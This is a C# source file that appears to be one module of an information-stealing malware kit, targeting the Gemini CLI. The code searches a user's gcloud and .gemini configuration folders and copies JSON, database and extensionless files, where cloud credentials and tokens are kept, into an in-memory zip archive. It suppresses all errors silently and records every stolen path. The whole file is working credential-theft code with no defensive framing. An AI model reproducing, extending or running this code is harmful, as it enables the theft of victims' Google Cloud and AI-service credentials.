using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class Gemini_CLI : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var entry = new Counter.CounterApplications { Name = "Gemini CLI" };
            string[] paths = {
                Path.Combine(appdata, "gcloud"),
                Path.Combine(userProfile, ".config", "gcloud"),
                Path.Combine(userProfile, ".gemini")
            };
            foreach (string dir in paths)
            {
                if (!Directory.Exists(dir)) continue;
                foreach (string file in Directory.GetFiles(dir, "*", SearchOption.TopDirectoryOnly))
                {
                    string ext = Path.GetExtension(file).ToLower();
                    if (ext != ".json" && ext != ".db" && ext != "") continue;
                    if (new FileInfo(file).Length > 2 * 1024 * 1024) continue;
                    try
                    {
                        string rel = "AI-Agent\\GeminiCLI\\" + Path.GetFileName(file);
                        zip.AddFile(rel, File.ReadAllBytes(file));
                        entry.Files.Add(file + " => " + rel);
                    }
                    catch { }
                }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
